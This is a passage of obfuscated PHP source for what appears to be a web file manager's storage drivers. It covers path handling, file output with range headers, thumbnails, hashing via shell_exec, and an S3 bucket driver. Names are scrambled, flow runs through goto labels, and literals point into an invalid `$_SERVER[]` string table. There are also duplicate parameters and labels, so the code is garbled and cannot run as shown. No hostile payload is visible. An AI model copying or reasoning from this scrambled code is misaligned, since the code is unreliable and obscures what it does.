$this->objectDriver)) { return ltrim($fͯ֏, $_SERVER[][8]); } return $fͯ֏; } public function iconvApp($D񰼍) { return $D񰼍; } public function iconvSystem($bו) { return $bו; } public function iconvTo($D䢳, $A⊓, $Cˍ) { goto dඛ; Eۧݘ: $E[$Cˍ . $A߃ݰ[67] . $A⊓ . $A߃ݰ[68] . $D䢳] = $D䢳; $E[$Cˍ . $A߃ݰ[67] . $A⊓ . $A߃ݰ[68] . $c] = $D䢳; $E[$A⊓ . $A߃ݰ[67] . $Cˍ . $A߃ݰ[68] . $c] = $c; goto EƄ; E: $D = $A⊓ . $A߃ݰ[67] . $Cˍ . $A߃ݰ[68] . $D䢳; if (isset($E[$D])) { return $E[$D]; } if (function_exists($A߃ݰ[69])) { $c = @mb_convert_encoding($D䢳, $Cˍ, $A⊓); } else { $c = @iconv($A⊓, $Cˍ, $D䢳); } goto a; EƄ: return $c; goto Eړ; dඛ: $A߃ݰ =& $_SERVER[]; if (!$D䢳 || !function_exists($A߃ݰ[66])) { return $D䢳; } static $E = array(); goto E; a: $c = $c ? $c : $D䢳; if (strstr($c, $A߃ݰ[70])) { $c = str_replace($A߃ݰ[70], $A߃ݰ[71], $c); } $E[$A⊓ . $A߃ݰ[67] . $Cˍ . $A߃ݰ[68] . $D䢳] = $c; goto Eۧݘ; Eړ: } public function getPathInner($E؇) { $f搜 = IO::init($E؇); return $f搜->path; } public function getPathOuter($A) { $D =& $_SERVER[]; $e̙ = strlen(trim($this->pathBase, $D[8])); $A = substr(trim($A, $D[8]), $e̙); return $this->pathDriver . $D[8] . ltrim($A, $D[8]); } public function isParentOf($aٕ, $A蹔) { $b쬃 =& $_SERVER[]; $aٕ = rtrim(strtolower($aٕ), $b쬃[8]) . $b쬃[8]; $A蹔 = rtrim(strtolower($A蹔), $b쬃[8]) . $b쬃[8]; $C = strpos($A蹔, $aٕ) === 0; return $C; } public function getType() { $C =& $_SERVER[]; $e® = str_replace($C[72], $C[33], get_class($this)); return strtolower($e®); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Bѹ, $Cع) { $a݃筃 =& $_SERVER[]; $d = rtrim($Bѹ, $a݃筃[8]) . $a݃筃[8] . $Cع; $cխÑ = $this->exist($d); return $cխÑ ? $d : !1; } public function setModifyTime($B㝛, $D = '') { } public function renameObject($Eɮ, $Eʧ) { goto Fͻ; F깡ʂ: return $Bإ ? $Eʧ : !1; goto d鹿; D: $Eɮ = $this->getPathOuter($Eɮ); $Eʧ = $this->pathFather($Eɮ) . $Eʧ; if (IO::isFile($Eɮ)) { $Bإ = IO::copy($Eɮ, $this->pathFather($Eɮ), REPEAT_RENAME_FOLDER, $D); if ($Bإ) { IO::remove($Eɮ); } } else { $Bإ = IO::mkdir($Eʧ); if (!$Bإ) { return !1; } $E੖ = IO::listPath($Eɮ, !0); $d店 = array_merge($E੖[$bɅ[74]], $E੖[$bɅ[75]]); foreach ($d店 as $a缉) { IO::move($a缉[$bɅ[76]], $Eʧ, REPEAT_RENAME_FOLDER); } IO::remove($Eɮ); } goto F깡ʂ; Fͻ: $bɅ =& $_SERVER[]; $D = $Eʧ; Hook::trigger($bɅ[73], $this, $Eɮ, $this, $this->pathFather($Eɮ) . $Eʧ); goto D; d鹿: } public function tempFile($C = '', $AÈ = '') { goto Fό; F: return $DڈƊ; goto A; c: $DڈƊ = $fь . $C; @touch($DڈƊ); if ($AÈ) { file_put_contents($DڈƊ, $AÈ); } goto F; Fό: if (!$C) { $C = rand_string(15); } $fь = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($fь, 511, !0); goto c; A: } public function tempFileRemve($c) { @unlink($c); @rmdir($this->pathFather($c)); } public function mkfile($dۈ, $B烥 = '', $Bؙ = REPEAT_RENAME) { } public function mkdir($Cũۈ, $Fօ = REPEAT_SKIP) { } public function delFile($A޽) { } public function delFolder($e) { } public function copyFile($F, $F) { } public function moveFile($Fኬ, $BǱ) { } public function remove($D؆ġ) { if ($this->isFile($D؆ġ)) { return $this->delFile($D؆ġ); } return $this->delFolder($D؆ġ); } public function rename($E폰ī, $aˮ۴) { } public function exist($f¢) { } public function findByHash($f = '', $E˭ = '') { return !1; } public function isFile($cԭǞ) { } public function isFolder($Aݮ) { } public function size($Bߊَ) { } public function info($Bʳ) { } public function infoSimple($bݖ) { return $this->info($bݖ); } public function infoAuth($E󏙑) { return $this->info($E󏙑); } public function infoFull($AϪׂ) { return $this->info($AϪׂ); } public function infoWithChildren($d) { $f쏦 =& $_SERVER[]; static $Cڃá = array(); if (isset($Cڃá[$d])) { return $Cڃá[$d]; } $e㜂չ = $this->info($d); if ($e㜂չ && $e㜂չ[$f쏦[29]] == $f쏦[77]) { $fٲǽ = array($f쏦[78] => 0, $f쏦[79] => 0, $f쏦[80] => 0); $this->infoChildren($d, $fٲǽ); $e㜂չ[$f쏦[78]] = $fٲǽ[$f쏦[78]]; $e㜂չ[$f쏦[81]] = array($f쏦[82] => $fٲǽ[$f쏦[79]], $f쏦[83] => $fٲǽ[$f쏦[80]]); $Cڃá[$d] = $e㜂չ; } return $e㜂չ; } public function listPath($dȤ޿, $bՍ = false) { } public function has($cڇ, $c˱ = false, $D쐦 = false) { } public function canRead($b렿֮) { } public function canWrite($EŮޟ) { } public function getContent($c፯) { } public function setContent($cӗј, $díͮ樺 = '') { } protected function infoChildren($b, &$e񨯋) { $D =& $_SERVER[]; check_abort_echo(); $FϏ = $this->listPath($b, !0); $FϏ = array_merge($FϏ[$D[75]], $FϏ[$D[74]]); foreach ($FϏ as $d) { if ($d[$D[29]] == $D[77]) { $e񨯋[$D[80]]++; $a = $this->getPathInner($d[$D[76]]); $this->infoChildren($a, $e񨯋); } else { $e񨯋[$D[79]]++; $e񨯋[$D[78]] += $d[$D[78]]; } } } public function fileSubstr($D׶, $E, $bǧ) { } public function listAll($C) { } public function listAllMake($dү, &$a) { $A =& $_SERVER[]; check_abort_echo(); $D = $this->listPath($dү, !0); if (!$D) { return; } $D = array_merge($D[$A[75]], $D[$A[74]]); foreach ($D as $Aޤ) { goto eƤ; EĪ: $this->listAllMake($Aޤ[$A[76]], $a); goto B; eƤ: $C = $Aޤ[$A[29]] == $A[77]; $F = array($A[76] => $Aޤ[$A[76]], $A[77] => $C); if (isset($Aޤ[$A[78]])) { $F[$A[78]] = $Aޤ[$A[78]]; } goto d捠ߟ; d捠ߟ: if (isset($Aޤ[$A[84]])) { $F[$A[84]] = $Aޤ[$A[84]]; } if (!$C) { $a[] = $F; continue; } $a[] = $F; goto EĪ; B: } } public function listAllSimple($fŊכ) { $B =& $_SERVER[]; $Fֲ = array(); $a݃Ɋ = $this->listAll($fŊכ); $B = $this->getPathOuter($fŊכ); foreach ($a݃Ɋ as $a) { goto Dɣ; Dɣ: $e = $a[$B[76]]; $B߅Ņ = $a[$B[76]]; if (isset($a[$B[85]])) { $e = $a[$B[85]][$B[76]]; $a[$B[78]] = $a[$B[85]][$B[78]]; $a[$B[84]] = $a[$B[85]][$B[84]]; } else { $B߅Ņ = substr($a[$B[76]], strlen(get_path_father($B))); $B߅Ņ = $B[8] . ltrim($B߅Ņ, $B[8]); } goto cּ; cּ: $C鑲 = array($B[76] => $B߅Ņ, $B[77] => $a[$B[77]]); if (isset($a[$B[78]]) && !$a[$B[77]]) { $C鑲[$B[78]] = $a[$B[78]]; } if (isset($a[$B[84]])) { $C鑲[$B[84]] = $a[$B[84]]; } goto cԝ; cԝ: if (!$a[$B[77]]) { $C鑲[$B[86]] = $e; } $Fֲ[] = $C鑲; goto BʑꙎ; BʑꙎ: } return $Fֲ; } public function upload($DΫ, $D, $c = false, $F = REPEAT_REPLACE) { } public function uploadFileByID($Bڇ, $FĎȏ, $aӕ) { } public function uploadFileByPath($e冏, $Fѩ, $dӄȂ = array()) { } public function isUploadServer() { $C =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $C[87]) { return !0; } return $GLOBALS[$C[6]][$C[88]][$C[89]]; } public function isFileOutServer() { $f𖓠 =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $f𖓠[87]) { return !0; } return $GLOBALS[$f𖓠[6]][$f𖓠[88]][$f𖓠[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fք) { $cӳ =& $_SERVER[]; if (!$this->isCdnHost()) { return $fք; } return str_replace(trim(get_url_root($fք), $cӳ[8]), trim($this->cdnHost, $cӳ[8]), $fք); } public function uploadLink($E輪, $bЊ = 0) { goto EӃǃ; e: if ($c) { $c[$Eۤ[93]] = $E輪; $c[$Eۤ[94]] = $A㩐ܞ; } return $c; goto cՠ; A: if (!in_array($A㩐ܞ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $e͂ = 1024 * 1024 * 10; goto FӘ; EӃǃ: $Eۤ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $A㩐ܞ = $this->getType(); goto A; FӘ: $Aӽ = $bЊ <= $e͂ ? $Eۤ[91] : $Eۤ[92]; $e׏ = (!$bЊ ? 1 : ceil($bЊ / pow(1024, 3))) * 3600 * 4; $c = $this->{$Aӽ}($E輪, $e׏); goto e; cՠ: } public function uploadFormData($f, $d◚ = 3600) { } public function multiUploadFormData($b, $D = 3600) { } public function download($fٌ, $C) { } public function ext($cǑ) { $F뉶 =& $_SERVER[]; if (strpos($cǑ, $F뉶[8]) === -1) { $d = $cǑ; } else { $d = $this->pathThis($cǑ); } $Aꄹތ = $F뉶[33]; if (strstr($d, $F뉶[95])) { $Aꄹތ = substr($d, strrpos($d, $F뉶[95]) + 1); $Aꄹތ = strtolower($Aꄹތ); } if (strlen($Aꄹތ) > 3 && preg_match($F뉶[96], $Aꄹތ, $cǱ)) { $Aꄹތ = $F뉶[33]; } return $Aꄹތ; } public function pathThis($c) { $d =& $_SERVER[]; $c = str_replace($d[97], $d[8], rtrim($c, $d[8])); $Fݏ = strrpos($c, $d[8]); if ($Fݏ === !1) { return $c; } return substr($c, $Fݏ + 1); } public function pathFather($Dӊ寮) { $e򍨮 =& $_SERVER[]; $Dӊ寮 = str_replace($e򍨮[97], $e򍨮[8], rtrim($Dӊ寮, $e򍨮[8])); $aζ = strrpos($Dӊ寮, $e򍨮[8]); if ($aζ === !1) { return $e򍨮[33]; } return substr($Dӊ寮, 0, $aζ + 1); } public function hashSimple($c۫) { goto Dտ; d،: $e = 200; $Cɧ = 50; if ($F <= $e * $Cɧ) { return $this->hashMd5($c۫) . $F; } goto f; Dտ: $Bŕŕ =& $_SERVER[]; if (!$c۫) { return md5($Bŕŕ[33]); } $F = $this->size($c۫); goto d،; f: $e = intval($F / $Cɧ); $d٤ = $Bŕŕ[33]; for ($E = 0; $E < $Cɧ; $E++) { $d٤ .= $this->fileSubstr($c۫, $e * $E, $e); } goto d; d: $d٤ .= $this->fileSubstr($c۫, $F - $e, $e); return md5($d٤) . $F; goto c􅵱; c􅵱: } public static $md5Cache = array(); public function hashMd5($dȂ) { $dȂ = $this->iconvSystem($dȂ); if (isset(self::$md5Cache[$dȂ])) { return self::$md5Cache[$dȂ]; } self::$md5Cache[$dȂ] = $this->hashMd5Shell($dȂ); if (!self::$md5Cache[$dȂ]) { self::$md5Cache[$dȂ] = @md5_file($dȂ); } return self::$md5Cache[$dȂ]; } private function hashMd5Shell($e) { goto e; F: $fʎ = Cache::get($d座[101]); if (!$fʎ) { $Cݏ = BASIC_PATH . $d座[102]; $c = md5_file($Cݏ); $fʎ = $d座[103]; foreach ($B as $B) { $Eٞ = shell_exec($B . "\x20\x22{$Cݏ}\42"); if ($Eٞ && substr(trim($Eٞ), 0, 32) == $c) { $fʎ = $B; break; } } Cache::set($d座[101], $fʎ, 3600); } if ($fʎ == $d座[103]) { return !1; } goto E֌; E֌: $Eٞ = shell_exec($fʎ . "\40\42{$e}\42"); $Eٞ = str_replace($d座[104], $d座[33], $Eٞ); return substr($Eٞ, 0, 32); goto aϋƎ; e: $d座 =& $_SERVER[]; if (!function_exists($d座[98])) { return !1; } $B = array($d座[99], $d座[100]); goto F; aϋƎ: } public function link($eԂ) { return $eԂ; } public function fileOut($A, $c = false, $cα = false, $dƞ럏 = '') { goto DĨ҃٥; BٗЄ: $dȮ呖 = strtolower($_SERVER[$aѾ[142]]); if ($fؒ && $dȮ呖 && $C) { if (strstr($dȮ呖, $aѾ[143])) { header($aѾ[144] . $A); } else { if (strstr($dȮ呖, $aѾ[145])) { header($aѾ[146] . $A); } else { if (strstr($dȮ呖, $aѾ[147])) { header($aѾ[148] . $A); } } } if ($C) { header($aѾ[149] . $C); } return; } if (isset($_SERVER[$aѾ[150]])) { if (preg_match($aѾ[151], $_SERVER[$aѾ[150]], $Aᥛ)) { $F洸 = intval($Aᥛ[1]); if (!empty($Aᥛ[2])) { $Aςݒ = intval($Aᥛ[2]); } } header($aѾ[152]); header("\x43\157\156\164\x65\x6e\x74\55\x52\x61\x6e\x67\x65\72\40\142\171\164\x65\163\x20{$F洸}\55{$Aςݒ}\57" . $Fުل); } else { header($aѾ[153]); } goto C; C: $fؒ = $this->getType() == $aѾ[106]; $C = $GLOBALS[$aѾ[6]][$aѾ[88]][$aѾ[107]][$aѾ[108]]; $C = (double) $GLOBALS[$aѾ[6]][$aѾ[88]][$aѾ[107]][$aѾ[109]] * 1024 * 1024; goto D; Cɘٿ: if ($C) { $Fޞ = intval(1000 * 1000 * ($Eٍ / $C)); } while ($F洸 <= $Aςݒ) { $cٰߩ = timeFloat(); check_abort(); $cŚ = $Aςݒ - $F洸 + 1; if ($cŚ <= $Eٍ) { $Eٍ = $cŚ; } echo $this->fileSubstr($A, $F洸, $Eٍ); $F洸 += $Eٍ; if ($Eٍ == $cŚ) { $F洸 = $Aςݒ + 1; } if ($Fޞ) { $a = intval(1000 * 1000 * (timeFloat() - $cٰߩ)); $c䪐 = $Fޞ - $a; if ($c䪐 > 5) { usleep($c䪐); } } } goto D; e: header($aѾ[138] . $Fުل); header($aѾ[139]); if (!$c && $Aƭ == $aѾ[140]) { if ($Fުل > 1024 * 1024 * 5) { die; } $d݋ = $this->getContent($A); $d݋ = Html::clearSVG($d݋); header($aѾ[141] . strlen($d݋)); echo $d݋; die; } goto BٗЄ; D㖑: if ($_SERVER[$aѾ[157]] == $aѾ[158]) { return; } $Eٍ = 1024 * 100; $Fޞ = 0; goto Cɘٿ; d: if (isset($_SERVER[$aѾ[131]]) && strtotime($_SERVER[$aѾ[131]]) == $fʝ[$aѾ[84]]) { header($aѾ[132], !0, 304); die; } if (isset($_SERVER[$aѾ[133]]) && $_SERVER[$aѾ[133]] == $dƞ럏) { header($aѾ[134] . $dƞ럏, !0, 304); die; } header($aѾ[134] . $dƞ럏); goto bة; DĨ҃٥: $aѾ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$A || !$this->exist($A)) { show_json(LNG($aѾ[105]), !1, $cα); } goto C; F֊ﺔ: if (in_array($Aƭ, array($aѾ[111], $aѾ[112], $aѾ[113], $aѾ[114]))) { $Aƭ = $aѾ[115]; } if (!$dƞ럏) { $dƞ럏 = md5($bی . $this->hashSimple($A)); } $dƞ럏 = $aѾ[116] . $dƞ럏 . $aѾ[116]; goto Aޔ; Fɇ: $F洸 = 0; $Aςݒ = $Fުل - 1; $Aƭ = $this->ext($aܦ); goto F֊ﺔ; d: header($aѾ[128]); header($aѾ[129]); header($aѾ[130]); goto d; D: @ob_end_clean(); set_timeout(); $fʝ = $this->infoFull($A); goto aϺ; aϺ: $Fުل = $fʝ[$aѾ[78]]; $bی = gmdate($aѾ[110], $fʝ[$aѾ[84]]); $aܦ = $cα ? $cα : $this->iconvApp($fʝ[$aѾ[28]]); goto Fɇ; C: $D⫓ = !0; if ($_SERVER[$aѾ[154]] == $aѾ[155] && $Fުل > 1204 * 1024 * 1024 * 2) { $D⫓ = !1; } if ($D⫓) { header($aѾ[156] . ($Aςݒ - $F洸 + 1)); } goto D㖑; bצސ: $DӾۦ = $aѾ[116] . $DӾۦ . $aѾ[122] . $DӾۦ; if ($c) { header($aѾ[123]); header($aѾ[124] . $DӾۦ); } else { header($aѾ[125] . $DӾۦ); } header($aѾ[126] . gmdate($aѾ[110], time() + 3600 * 24 * 30) . $aѾ[127]); goto d; bة: header($aѾ[135] . $bی . $aѾ[127]); header($aѾ[136] . $aܦ); header($aѾ[137]); goto e; Aޔ: $dǦ = get_file_mime($Aƭ); if (strstr($dǦ, $aѾ[117])) { $dǦ = $dǦ . $aѾ[118]; } if ($c === !1 && !mime_support($dǦ)) { $c = !0; $dǦ = $aѾ[119]; } goto cʪ؄ܳ; cʪ؄ܳ: header($aѾ[120]); header($aѾ[121] . $dǦ); $DӾۦ = rawurlencode($aܦ); goto bצސ; D: } public function fileOutServer($A粐, $eݐ = false, $dٚ = false, $dԪê = '') { $this->fileOut($A粐, $eݐ, $dٚ, $dԪê); } public function fileOutLink($Dц) { header($_SERVER[][159] . $Dц); die; } public function cacheMethod($fٱ, $eЃ, $aٲ = null) { goto A֨; D: if (!is_null($aٲ)) { $aЗ[$dȅ] = $aٲ; return; } $D = isset($aЗ[$dȅ]) ? $aЗ[$dȅ] : null; if (!is_null($D)) { return $D; } goto a; a: $D = $this->{$fٱ}($eЃ); $aЗ[$dȅ] = $D; return $D; goto aƽ; A֨: $fŌ =& $_SERVER[]; static $aЗ = array(); $bǛ = $eЃ ? ltrim($this->getPathOuter($eЃ), $fŌ[8]) : $eЃ; goto eÔò쿐; eÔò쿐: $dȅ = $fŌ[160] . $fٱ . $fŌ[161] . rtrim($bǛ, $fŌ[8]); if (is_null($fٱ)) { $aЗ = array(); return; } if (is_null($eЃ)) { unset($aЗ[$dȅ]); return; } goto D; aƽ: } public function fileOutImage($Dω, $AŎ = 250) { goto cҏ; aΧ: if (!@file_exists($fЋ)) { $b = TEMP_FILES; if (!is_dir($b)) { mk_dir($b); } $Eʐ = $b . $E . $e[95] . $Ȧ[$e[168]]; if (!@file_exists($Eʐ)) { $Eʐ = $this->download($Dω, $Eʐ); } ImageThumb::createThumb($Eʐ, $fЋ, $AŎ, $AŎ * 10); } if (!file_exists($fЋ) || filesize($fЋ) < 100) { return @file_exists($Eʐ) ? IO::fileOut($Eʐ) : $this->fileOut($Dω); } if (!($a = IO::move($fЋ, $b))) { return IO::fileOut($fЋ); } goto eߘ; FϬ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $fЋ = DATA_THUMB . $Dڲň; del_file($fЋ); goto aΧ; cҏ: $e =& $_SERVER[]; set_timeout(); if (substr($Dω, 0, 4) == $e[147]) { $this->fileOutLink($Dω); } goto BѺɡ; eߘ: del_file($fЋ); IO::fileOut($a); goto d׌; a: if (isset($GLOBALS[$e[162]]) && $GLOBALS[$e[162]][$e[76]] == $Ȧ[$e[76]]) { $eܤ· = $GLOBALS[$e[162]][$e[163]]; if (!$Ȧ[$e[164]]) { $Ȧ[$e[164]] = $GLOBALS[$e[162]]; } if (isset($eܤ·[$e[165]])) { if ($eܤ·[$e[165]] <= $AŎ && $eܤ·[$e[166]] <= $AŎ) { $B = !0; } } $B = $Ȧ[$e[164]][$e[28]]; } if ($Ȧ[$e[78]] <= 1024 * 50 || $B || !function_exists($e[167]) || $Ȧ[$e[168]] == $e[169]) { return $this->fileOut($Dω, !1, $B); } if (isset($Ȧ[$e[164]][$e[170]])) { $E = $Ȧ[$e[164]][$e[170]]; } else { if (isset($Ȧ[$e[164]][$e[171]])) { $E = $Ȧ[$e[164]][$e[171]]; } else { $E = md5("{$Ȧ[$e[28]]}\x5f{$Ȧ[$e[76]]}\x5f{$Ȧ[$e[78]]}"); } } goto Bﲺݐ; BѺɡ: $Ȧ = $this->info($Dω); $B = $Ȧ[$e[28]]; $B = !1; goto a; Bﲺݐ: $Dڲň = "{$E}\x5f{$AŎ}\x2e\x70\156\147"; if (!($bᮟ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $e[172]))) { $b = IO::mkdir(IO_PATH_SYSTEM_TEMP . $e[173]); } else { $b = KodIO::make($bᮟ); } if ($bᮟ = IO::fileNameExist($b, $Dڲň)) { $fЋ = KodIO::make($bᮟ); return IO::fileOut($fЋ, !1, $B); } goto FϬ; d׌: } public function fileOutImageServer($BՃߔ, $Fؓ = 250) { $this->fileOutImage($BՃߔ, $Fؓ); } public function fileNameAuto($dŴ, $eҨ, $F = REPEAT_RENAME, $B = false) { goto D߽ƈ; D߽ƈ: $a =& $_SERVER[]; $B = $dŴ === $a[33] ? $eҨ : rtrim($dŴ, $a[8]) . $a[8] . $eҨ; if ($F == REPEAT_REPLACE || !$this->exist($B) || $B && $F != REPEAT_RENAME_FOLDER) { return $eҨ; } goto e¡; e¡: if ($F == REPEAT_SKIP) { return !1; } $e = $a[95] . get_path_ext($eҨ); $e = $e == $a[95] || $B ? $a[33] : $e; goto B; B: $A = 1; $E̥ź = substr($eҨ, 0, strlen($eҨ) - strlen($e)); $f = $E̥ź . "\x28{$A}\51{$e}"; goto Fȡ; Fȡ: while ($this->exist(rtrim($dŴ, $a[8]) . $a[8] . $f)) { $f = $E̥ź . "\50{$A}\51{$e}"; $A++; } return $f; goto Cʡԓ; Cʡԓ: } private function fileNameAutoList($fڱ, $aµ, $aᑖԑ = false) { goto Bحݠ; a: return $E☐玞; goto aßۆ; eɚ㌣: $eю = substr($aµ, 0, strlen($aµ) - strlen($F㥰)); $E☐玞 = $eю . "\50\60\51{$F㥰}"; for ($Aݢ = 1; $Aݢ <= count($b) + 1; $Aݢ++) { $E☐玞 = $eю . "\x28{$Aݢ}\x29{$F㥰}"; if (!in_array_not_case($E☐玞, $b)) { return $E☐玞; } } goto a; Bحݠ: $e䚉 =& $_SERVER[]; $f = $this->listPath($fڱ, !0); $f = array_merge($f[$e䚉[75]], $f[$e䚉[74]]); goto fٕ; fٕ: $b = array_to_keyvalue($f, $e䚉[33], $e䚉[28]); $F㥰 = $e䚉[95] . get_path_ext($aµ); $F㥰 = $F㥰 == $e䚉[95] || $aᑖԑ ? $e䚉[33] : $F㥰; goto eɚ㌣; aßۆ: } public function listAllFiles($Aʤݲ, $D, $E = array()) { goto dω; e: $Aʤݲ = trim($Aʤݲ, $a͛ϫ[8]); foreach ($D as $E) { $DȘߍ = ltrim(substr(trim($E, $a͛ϫ[8]), strlen($Aʤݲ)), $a͛ϫ[8]); $Cӕŗ = array_merge($Cӕŗ, $this->slicePath($DȘߍ)); } $c靏 = array(); goto c˞; c˞: foreach (array_unique($Cӕŗ) as $E) { $C䎟 = array($a͛ϫ[76] => $this->getPathOuter($a͛ϫ[8] . $Aʤݲ . $a͛ϫ[8] . $E), $a͛ϫ[77] => 1, $a͛ϫ[78] => 0); if (substr($E, -1) != $a͛ϫ[8]) { $C䎟[$a͛ϫ[77]] = 0; $F = $this->getPath($Aʤݲ . $a͛ϫ[8] . $E); $C䎟[$a͛ϫ[78]] = isset($E[$F]) ? $E[$F] : $this->size($F); } $c靏[] = $C䎟; } return $c靏; goto Eٍ; dω: $a͛ϫ =& $_SERVER[]; if (empty($D)) { return array(); } $Cӕŗ = array(); goto e; Eٍ: } public function slicePath($fۧ) { $A缡 =& $_SERVER[]; $Aˍ = explode($A缡[8], trim($fۧ, $A缡[8])); $Dچ = 0; do { ++$Dچ; $d҇[] = implode($A缡[8], array_slice($Aˍ, 0, $Dچ)) . $A缡[8]; } while ($Dچ < count($Aˍ)); $d҇[count($Aˍ) - 1] = $fۧ; return $d҇; } public function getHost() { $bԯ =& $_SERVER[]; $Aɱ = parse_url(trim($this->domain, $bԯ[8])); $aۍ = isset($Aɱ[$bԯ[174]]) ? $Aɱ[$bԯ[174]] : http_type(); $FЄ˴ = isset($Aɱ[$bԯ[175]]) ? $Aɱ[$bԯ[175]] : $Aɱ[$bԯ[76]]; if (isset($Aɱ[$bԯ[176]])) { $FЄ˴ .= $bԯ[4] . $Aɱ[$bԯ[176]]; } return $aۍ . $bԯ[177] . $FЄ˴; } public function pathEncode($Dݵײ) { $F茣 =& $_SERVER[]; return str_replace($F茣[178], $F茣[8], rawurlencode($Dݵײ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($AЭ¥΍) { set_timeout(); require_once SDK_DIR . $_SERVER[][179]; parent::__construct(); $this->_init($AЭ¥΍); } public function _init($dƣ) { foreach ($dƣ as $A伮 => $b) { if (isset($this->{$A伮})) { $this->{$A伮} = $b; } } $this->endpoint = $dƣ[$_SERVER[][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($fÃɒ = "\166\64") { $this->signVer = $fÃɒ; $this->client->setSignatureVersion($fÃɒ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Fݭ; a舮ך: $Dϒӽ = array($f̓ۋ[186], $f̓ۋ[187], $f̓ۋ[188], $f̓ۋ[189], $f̓ۋ[190]); $Aߛ = array_diff($Dϒӽ, $E⪇ؼ); return empty($Aߛ); goto D; Fݭ: $f̓ۋ =& $_SERVER[]; $Cػ = $this->getBucketCors(); if (!$Cػ || !is_array($Cػ)) { return !1; } goto e; e: if ($Cػ[$f̓ۋ[181]] != $f̓ۋ[182] || $Cػ[$f̓ۋ[183]] != $f̓ۋ[182]) { return !1; } $E⪇ؼ = array_map($f̓ۋ[184], $Cػ[$f̓ۋ[185]]); if (!is_array($E⪇ؼ)) { $E⪇ؼ = array(); } goto a舮ך; D: } public function mkfile($C求, $BᎽ = '', $E޹ = REPEAT_RENAME) { $f = $this->setContent($C求, $BᎽ); if ($f !== !1) { return $this->getPathOuter($C求); } return !1; } public function mkdir($fޝ, $e = REPEAT_SKIP) { $B =& $_SERVER[]; if (empty($fޝ) && $fޝ !== $B[191]) { return !1; } if ($this->_isFolder($fޝ)) { return $this->getPathOuter($fޝ); } $Eʻ㉙ = $this->setContent($fޝ, $B[33], !0); if ($Eʻ㉙ !== !1) { return $this->getPathOuter($fޝ); } return !1; } public function copyFile($e, $cǋݓ, $Bܘ̈́ = array()) { $F҉ =& $_SERVER[]; $Bؤ = $this->objectMeta($e); if (!$Bؤ) { return !1; } if ($Bؤ[$F҉[78]] <= 1024 * 1024 * 200) { $f䲬 = $this->client->copyObject($this->bucket, $e, $this->bucket, $cǋݓ, $F҉[192], $Bܘ̈́); } else { $f䲬 = $this->client->multiCopyObject($this->bucket, $e, $this->bucket, $cǋݓ, $Bܘ̈́); } $f䲬 = $f䲬 ? $this->getPathOuter($cǋݓ) : !1; return $f䲬; } public function moveFile($D, $d) { if ($this->copyFile($D, $d)) { $this->delFile($D); return $this->getPathOuter($d); } return !1; } public function delFile($aЙ) { return $this->client->deleteObject($this->bucket, $aЙ); } public function delFolder($Dɧ) { goto cꑰ; f: if (!empty($Dɧ) && $Dɧ !== $B[191] && !in_array($cे, $DﻶҶ[$B[75]])) { $DﻶҶ[$B[75]][] = $cे; } $A = $this->delByBatch($DﻶҶ[$B[74]]); if (!$A) { return !1; } goto c; Aߍ٩: $DﻶҶ = $this->fileList($Dɧ); $this->listItemCache = !0; $cे = trim($Dɧ, $B[8]) . $B[8]; goto f; cꑰ: $B =& $_SERVER[]; if (!$this->exist($Dɧ)) { return !0; } $this->listItemCache = !1; goto Aߍ٩; c: $A = $this->delByBatch($DﻶҶ[$B[75]]); if (!$A) { return !1; } return $this->delFile($cे); goto Fد; Fد: } private function delByBatch($e) { foreach (array_chunk($e, 1000) as $bМ̳) { $e = $this->client->deleteObjects($this->bucket, $bМ̳); if (!$e) { return !1; } } return !0; } public function rename($a֎, $C) { return $this->renameObject($a֎, $C); } public function listPath($dϳ, $C = false) { $B =& $_SERVER[]; $F = $this->fileList($dϳ, $B[8], !0); foreach ($F[$B[75]] as $Fˈ => $FГ) { $F[$B[75]][$Fˈ] = $this->folderInfo($FГ, $C); } foreach ($F[$B[74]] as $Fˈ => $FГ) { $F[$B[74]][$Fˈ] = $this->fileInfo($FГ[$B[28]], $C, $FГ); } return $F; } private function fileInfo($cԴ˗, $Bզ = false, $e˂뗾 = array()) { goto e; CĐ: if (isset($e˂뗾[$aѥ[197]])) { $fϾ[$aѥ[84]] = $e˂뗾[$aѥ[197]]; } if (isset($e˂뗾[$aѥ[78]])) { $fϾ[$aѥ[78]] = $e˂뗾[$aѥ[78]]; } return $fϾ; goto AÛ; e: $aѥ =& $_SERVER[]; $fϾ = array($aѥ[28] => $this->pathThis($cԴ˗), $aѥ[76] => $this->getPathOuter($cԴ˗), $aѥ[29] => $aѥ[193], $aѥ[168] => $this->ext($cԴ˗), $aѥ[78] => isset($e˂뗾[$aѥ[78]]) ? $e˂뗾[$aѥ[78]] : 0); if ($Bզ) { return $fϾ; } goto aƕ; aƕ: $fϾ[$aѥ[194]] = $fϾ[$aѥ[84]] = 0; $fϾ[$aѥ[195]] = $fϾ[$aѥ[196]] = !0; if (empty($e˂뗾)) { $e˂뗾 = $this->objectMeta($cԴ˗); if (!$e˂뗾) { return $fϾ; } } goto CĐ; AÛ: } private function folderInfo($F, $BɄ󅳾 = false) { goto C礶; C礶: $cΌ =& $_SERVER[]; $d = array($cΌ[28] => $this->pathThis($F), $cΌ[76] => $this->getPathOuter($cΌ[8] . $F), $cΌ[29] => $cΌ[77]); if ($BɄ󅳾) { return $d; } goto fޝ; b: return $d; goto b; fޝ: $d[$cΌ[194]] = $d[$cΌ[84]] = 0; 